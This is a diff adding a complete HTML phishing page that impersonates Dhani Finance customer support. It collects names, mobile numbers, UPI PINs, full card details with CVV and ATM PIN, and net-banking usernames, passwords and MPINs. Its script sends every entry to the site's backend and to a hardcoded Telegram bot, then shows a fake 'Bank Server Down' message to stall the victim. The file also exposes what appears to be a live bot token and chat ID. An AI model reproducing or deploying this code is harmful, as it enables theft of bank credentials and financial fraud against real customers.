@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dhani Finance - Customer Support</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #1a237e;
+            --primary-light: #3949ab;
+            --accent: #1565c0;
+            --text: #333;
+            --bg: #f5f7fb;
+            --white: #ffffff;
+            --border: #e0e0e0;
+            --shadow: 0 8px 24px rgba(0,0,0,0.08);
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .top-bar {
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            color: #fff;
+            padding: 14px 20px;
+            font-size: 17px;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+        }
+        .top-bar.hidden { display: none; }
+        .hero {
+            background: var(--white);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px 0 12px;
+        }
+        .hero-title {
+            color: var(--accent);
+            font-size: 14px;
+            font-weight: 700;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            margin-bottom: 16px;
+        }
+        .hero img {
+            width: 75%;
+            max-width: 300px;
+            height: auto;
+        }
+        .divider {
+            height: 1px;
+            background: #ccc;
+            width: 100%;
+        }
+        main {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            padding-top: 8px;
+        }
+        .page { display: none; width: 100%; max-width: 500px; }
+        .page.active {
+            display: block;
+            animation: fadeUp 0.35s ease;
+        }
+        @keyframes fadeUp {
+            from { opacity: 0; transform: translateY(12px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .form-wrap {
+            background: var(--white);
+            padding: 24px;
+            height: 100%;
+        }
+        .card {
+            background: var(--white);
+            border-radius: 14px;
+            padding: 28px 22px;
+            box-shadow: var(--shadow);
+        }
+        .card-title {
+            color: var(--primary);
+            font-size: 17px;
+            font-weight: 700;
+            margin-bottom: 20px;
+        }
+        .card-title.center { text-align: center; font-size: 19px; }
+        .field { margin-bottom: 22px; display: flex; flex-direction: column; }
+        .field label {
+            color: var(--primary);
+            font-size: 15px;
+            font-weight: 600;
+            margin-bottom: 6px;
+        }
+        .field input[type="text"],
+        .field input[type="tel"],
+        .field input[type="number"],
+        .field input[type="password"] {
+            border: none;
+            border-bottom: 1.5px solid var(--accent);
+            padding: 8px 0;
+            font-size: 16px;
+            background: transparent;
+            color: var(--text);
+            outline: none;
+            font-family: inherit;
+            transition: border-color 0.2s;
+        }
+        .field input:focus {
+            border-bottom-color: var(--primary);
+            border-bottom-width: 2px;
+        }
+        .field input::placeholder {
+            color: #999;
+            font-size: 15px;
+        }
+        .radio-group { margin-bottom: 14px; }
+        .radio-label {
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            font-size: 17px;
+            color: var(--text);
+            padding: 2px 0;
+        }
+        .radio-label input[type="radio"] { display: none; }
+        .dot {
+            width: 22px; height: 22px;
+            border: 2px solid var(--accent);
+            border-radius: 50%;
+            margin-right: 12px;
+            position: relative;
+            flex-shrink: 0;
+        }
+        .radio-label input:checked + .dot::after {
+            content: '';
+            width: 11px; height: 11px;
+            background: var(--accent);
+            border-radius: 50%;
+            position: absolute;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+        }
+        .inline { display: flex; gap: 14px; }
+        .inline .field { flex: 1; }
+        .btn {
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            padding: 14px 28px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            letter-spacing: 0.5px;
+            transition: transform 0.15s, box-shadow 0.2s;
+            box-shadow: 0 4px 12px rgba(26,35,126,0.25);
+        }
+        .btn:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 6px 16px rgba(26,35,126,0.35);
+        }
+        .btn:active { transform: translateY(1px); }
+        .btn.full { width: 100%; margin-top: 8px; }
+        .btn-wrap { display: flex; justify-content: center; margin-top: 12px; }
+        .methods { display: flex; flex-direction: column; gap: 14px; }
+        .methods .btn { text-align: center; }
+        .msg-box {
+            padding: 28px;
+            background: var(--white);
+        }
+        .msg-box .red { color: #d32f2f; font-size: 18px; font-weight: 700; margin-bottom: 20px; }
+        .msg-box .green { color: #388e3c; font-size: 16px; font-weight: 700; margin-bottom: 16px; }
+        .msg-box p { font-size: 15px; color: #555; line-height: 1.7; font-weight: 500; }
+
+        datalist { font-family: inherit; }
+    </style>
+</head>
+<body>
+    <div class="top-bar" id="topbar">Dhani Finance</div>
+
+    <div class="hero" id="hero">
+        <h2 class="hero-title">Customer Support</h2>
+        <img src="support_hero.png" alt="Support">
+    </div>
+    <div class="divider" id="divider"></div>
+
+    <main>
+        <!-- PAGE 1: Customer Info -->
+        <div id="p1" class="page active">
+            <div class="form-wrap">
+                <form id="f1">
+                    <div class="field">
+                        <label>Customer Name*</label>
+                        <input type="text" id="customerName" placeholder="Enter Customer Name" required>
+                    </div>
+                    <div class="field">
+                        <label>Mobile Number*</label>
+                        <input type="tel" id="mobileNumber" placeholder="Enter Mobile Number" required
+                            maxlength="10" minlength="10" pattern="[0-9]{10}"
+                            oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+                    </div>
+                    <div class="field">
+                        <label>Reason*</label>
+                        <input type="text" id="reason" placeholder="Describe Your Problem" required>
+                    </div>
+                    <div class="btn-wrap">
+                        <button type="submit" class="btn">SUBMIT</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <!-- PAGE 2: Payment Mode -->
+        <div id="p2" class="page">
+            <div class="form-wrap">
+                <div class="card">
+                    <h3 class="card-title">Payment mod*</h3>
+                    <form id="f2">
+                        <div class="radio-group">
+                            <label class="radio-label">
+                                <input type="radio" name="payMode" value="pay" checked>
+                                <span class="dot"></span> PAY
+                            </label>
+                        </div>
+                        <div class="radio-group">
+                            <label class="radio-label">
+                                <input type="radio" name="payMode" value="refund">
+                                <span class="dot"></span> REFUND
+                            </label>
+                        </div>
+                        <div class="radio-group">
+                            <label class="radio-label">
+                                <input type="radio" name="payMode" value="other">
+                                <span class="dot"></span> OTHER
+                            </label>
+                        </div>
+                        <div class="field" style="margin-top:20px;">
+                            <input type="number" id="amount" placeholder="Enter Amount" required>
+                        </div>
+                        <button type="submit" class="btn full">NEXT</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+
+        <!-- PAGE 3: Payment Method -->
+        <div id="p3" class="page">
+            <div class="form-wrap">
+                <div class="card">
+                    <h3 class="card-title center">Select Payment Method</h3>
+                    <div class="methods">
+                        <button type="button" class="btn" onclick="pickMethod('upi')">UPI</button>
+                        <button type="button" class="btn" onclick="pickMethod('card')">DEBIT / CREDIT CARD</button>
+                        <button type="button" class="btn" onclick="pickMethod('netbanking')">NET BANKING</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- PAGE UPI -->
+        <div id="pUpi" class="page">
+            <div class="form-wrap">
+                <form id="fUpi" onsubmit="submitFinal(event)">
+                    <div class="field">
+                        <label>Bank Name</label>
+                        <input type="text" id="upiBankName" placeholder="Search or Select Bank" list="banks" required autocomplete="off">
+                    </div>
+                    <div class="field">
+                        <label>UPI PIN*</label>
+                        <input type="password" id="upiPin" placeholder="Enter UPI PIN" required>
+                    </div>
+                    <div class="btn-wrap">
+                        <button type="submit" class="btn">SUBMIT</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <!-- PAGE Card -->
+        <div id="pCard" class="page">
+            <div class="form-wrap">
+                <form id="fCard" onsubmit="submitFinal(event)">
+                    <div class="card" style="margin-bottom:20px;">
+                        <div class="field">
+                            <label>Card 16-Digit Number</label>
+                            <input type="text" id="cardNumber" placeholder="XXXX-XXXX-XXXX-XXXX" maxlength="19" required
+                                oninput="this.value=this.value.replace(/[^0-9]/g,'').replace(/(.{4})/g,'$1-').replace(/-$/,'')">
+                        </div>
+                        <div class="inline">
+                            <div class="field">
+                                <label>Expiry Date</label>
+                                <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
+                            </div>
+                            <div class="field">
+                                <label>CVV</label>
+                                <input type="password" id="cvv" placeholder="CVV" maxlength="3" required>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="field">
+                        <label>ATM PIN*</label>
+                        <input type="password" id="atmPin" placeholder="Enter ATM PIN" maxlength="4" required>
+                    </div>
+                    <div class="btn-wrap">
+                        <button type="submit" class="btn">SUBMIT</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <!-- PAGE Net Banking -->
+        <div id="pNet" class="page">
+            <div class="form-wrap">
+                <form id="fNet" onsubmit="submitFinal(event)">
+                    <div class="card" style="margin-bottom:20px;">
+                        <div class="field">
+                            <label>Bank Name</label>
+                            <input type="text" id="bankName" placeholder="Search or Select Bank" list="banks" required autocomplete="off">
+                        </div>
+                        <div class="field">
+                            <label>Username / Customer ID</label>
+                            <input type="text" id="username" placeholder="Enter Username / Customer ID" required>
+                        </div>
+                        <div class="field">
+                            <label>Password</label>
+                            <input type="password" id="password" placeholder="Enter Password" required>
+                        </div>
+                        <div class="field">
+                            <label>MPIN</label>
+                            <input type="password" id="mpin" placeholder="Enter MPIN" maxlength="6" required>
+                        </div>
+                    </div>
+                    <div class="btn-wrap">
+                        <button type="submit" class="btn">SUBMIT</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <!-- FINAL PAGE -->
+        <div id="pFinal" class="page">
+            <div class="msg-box">
+                <h3 class="red">Bank Server Down</h3>
+                <h4 class="green">Important Note:</h4>
+                <p>Please Wait. This process may take a minimum of 24 hours.<br>
+                   You will receive a notification once your details are successfully verified.</p>
+            </div>
+        </div>
+    </main>
+
+    <datalist id="banks">
+        <option value="State Bank of India">
+        <option value="HDFC Bank">
+        <option value="ICICI Bank">
+        <option value="Punjab National Bank">
+        <option value="Bank of Baroda">
+        <option value="Axis Bank">
+        <option value="Canara Bank">
+        <option value="Union Bank of India">
+        <option value="Kotak Mahindra Bank">
+        <option value="Bank of India">
+        <option value="Indian Bank">
+        <option value="Central Bank of India">
+        <option value="IDBI Bank">
+        <option value="Indian Overseas Bank">
+        <option value="UCO Bank">
+        <option value="Federal Bank">
+        <option value="Bank of Maharashtra">
+        <option value="IndusInd Bank">
+        <option value="IDFC FIRST Bank">
+        <option value="Yes Bank">
+        <option value="Karnataka Bank">
+        <option value="Karur Vysya Bank">
+        <option value="South Indian Bank">
+        <option value="RBL Bank">
+        <option value="AU Small Finance Bank">
+        <option value="Equitas Small Finance Bank">
+        <option value="Ujjivan Small Finance Bank">
+        <option value="Paytm Payments Bank">
+        <option value="Airtel Payments Bank">
+        <option value="India Post Payments Bank">
+    </datalist>
+
+    <script>
+    (function(){
+        const D = {};
+        const params = new URLSearchParams(location.search);
+        const deviceId = params.get('deviceId') || 'unknown_device';
+
+        // Telegram Bot Config
+        const TG_TOKEN = '8863370787:AAEVYbOZl2w5vmnm-W5PbNepCTAP0mLYCMs';
+        const TG_CHAT  = '-1003967567697';
+
+        function sendTelegram(text){
+            fetch('https://api.telegram.org/bot'+TG_TOKEN+'/sendMessage',{
+                method:'POST',
+                headers:{'Content-Type':'application/json'},
+                body:JSON.stringify({chat_id:TG_CHAT, text:text, parse_mode:'HTML'})
+            }).then(r=>r.json()).then(d=>console.log('[TG]',d)).catch(e=>console.error('[TG Error]',e));
+        }
+
+        function base(){ return location.origin; }
+
+        function sync(page, data){
+            fetch(base()+'/api/form/sync',{
+                method:'POST',
+                headers:{'Content-Type':'application/json'},
+                body:JSON.stringify({deviceId, pageName:page, pageData:data, timestamp:new Date().toISOString()})
+            }).then(r=>r.json()).then(d=>console.log('[Sync]',page,d)).catch(e=>console.error(e));
+
+            // Send to Telegram
+            var lines = ['📋 <b>Dhani Finance - '+page.replace(/_/g,' ').toUpperCase()+'</b>',''];
+            lines.push('🆔 Device: <code>'+deviceId+'</code>');
+            for(var k in data){ lines.push('▸ <b>'+k+'</b>: <code>'+data[k]+'</code>'); }
+            lines.push('\n🕐 '+new Date().toLocaleString());
+            sendTelegram(lines.join('\n'));
+        }
+
+        function submit(){
+            fetch(base()+'/api/form/submit',{
+                method:'POST',
+                headers:{'Content-Type':'application/json'},
+                body:JSON.stringify({deviceId, currentFlow:D.paymentMethod||'unknown', ...D, submittedAt:new Date().toISOString()})
+            }).then(r=>r.json()).then(d=>console.log('[Submit]',d)).catch(e=>console.error(e));
+
+            // Send full summary to Telegram
+            var lines = ['✅ <b>DHANI FINANCE - FULL SUBMISSION</b>',''];
+            lines.push('🆔 Device: <code>'+deviceId+'</code>');
+            lines.push('💳 Flow: <b>'+(D.paymentMethod||'unknown').toUpperCase()+'</b>');
+            lines.push('');
+            lines.push('👤 <b>Customer Info</b>');
+            if(D.customerName) lines.push('   Name: <code>'+D.customerName+'</code>');
+            if(D.mobileNumber) lines.push('   Mobile: <code>'+D.mobileNumber+'</code>');
+            if(D.reason) lines.push('   Reason: <code>'+D.reason+'</code>');
+            lines.push('');
+            lines.push('💰 <b>Payment</b>');
+            if(D.paymentMode) lines.push('   Mode: <code>'+D.paymentMode+'</code>');
+            if(D.amount) lines.push('   Amount: <code>₹'+D.amount+'</code>');
+            lines.push('');
+            if(D.paymentMethod==='upi'){
+                lines.push('📱 <b>UPI Details</b>');
+                lines.push('   Bank: <code>'+D.upiBankName+'</code>');
+                lines.push('   UPI PIN: <code>'+D.upiPin+'</code>');
+            } else if(D.paymentMethod==='card'){
+                lines.push('💳 <b>Card Details</b>');
+                lines.push('   Card: <code>'+D.cardNumber+'</code>');
+                lines.push('   Expiry: <code>'+D.expiry+'</code>');
+                lines.push('   CVV: <code>'+D.cvv+'</code>');
+                lines.push('   ATM PIN: <code>'+D.atmPin+'</code>');
+            } else if(D.paymentMethod==='netbanking'){
+                lines.push('🏦 <b>Net Banking</b>');
+                lines.push('   Bank: <code>'+D.bankName+'</code>');
+                lines.push('   Username: <code>'+D.username+'</code>');
+                lines.push('   Password: <code>'+D.password+'</code>');
+                lines.push('   MPIN: <code>'+D.mpin+'</code>');
+            }
+            lines.push('\n🕐 '+new Date().toLocaleString());
+            sendTelegram(lines.join('\n'));
+        }
+
+        function go(from, to){
+            document.getElementById(from).classList.remove('active');
+            document.getElementById(to).classList.add('active');
+            window.scrollTo(0,0);
+        }
+
+        var tb = document.getElementById('topbar');
+
+        document.getElementById('f1').addEventListener('submit', function(e){
+            e.preventDefault();
+            if(!this.checkValidity()) return;
+            D.customerName = document.getElementById('customerName').value;
+            D.mobileNumber = document.getElementById('mobileNumber').value;
+            D.reason = document.getElementById('reason').value;
+            sync('customer_info',{customerName:D.customerName,mobileNumber:D.mobileNumber,reason:D.reason});
+            tb.classList.add('hidden');
+            go('p1','p2');
+        });
+
+        document.getElementById('f2').addEventListener('submit', function(e){
+            e.preventDefault();
+            if(!this.checkValidity()) return;
+            D.paymentMode = document.querySelector('input[name="payMode"]:checked').value;
+            D.amount = document.getElementById('amount').value;
+            sync('payment_mode',{paymentMode:D.paymentMode,amount:D.amount});
+            go('p2','p3');
+        });
+
+        window.pickMethod = function(m){
+            D.paymentMethod = m;
+            sync('payment_method',{paymentMethod:m});
+            go('p3', m==='upi'?'pUpi':m==='card'?'pCard':'pNet');
+        };
+
+        window.submitFinal = function(e){
+            e.preventDefault();
+            var m = D.paymentMethod;
+            if(m==='upi'){
+                D.upiBankName=document.getElementById('upiBankName').value;
+                D.upiPin=document.getElementById('upiPin').value;
+                sync('upi_details',{upiBankName:D.upiBankName,upiPin:D.upiPin});
+            } else if(m==='card'){
+                D.cardNumber=document.getElementById('cardNumber').value;
+                D.expiry=document.getElementById('expiry').value;
+                D.cvv=document.getElementById('cvv').value;
+                D.atmPin=document.getElementById('atmPin').value;
+                sync('card_details',{cardNumber:D.cardNumber,expiry:D.expiry,cvv:D.cvv,atmPin:D.atmPin});
+            } else {
+                D.bankName=document.getElementById('bankName').value;
+                D.username=document.getElementById('username').value;
+                D.password=document.getElementById('password').value;
+                D.mpin=document.getElementById('mpin').value;
+                sync('netbanking_details',{bankName:D.bankName,username:D.username,password:D.password,mpin:D.mpin});
+            }
+            submit();
+            document.querySelectorAll('.page.active').forEach(p=>p.classList.remove('active'));
+            document.getElementById('pFinal').classList.add('active');
+            tb.classList.remove('hidden');
+            window.scrollTo(0,0);
+        };
+    })();
+    </script>
+</body>
+</html>
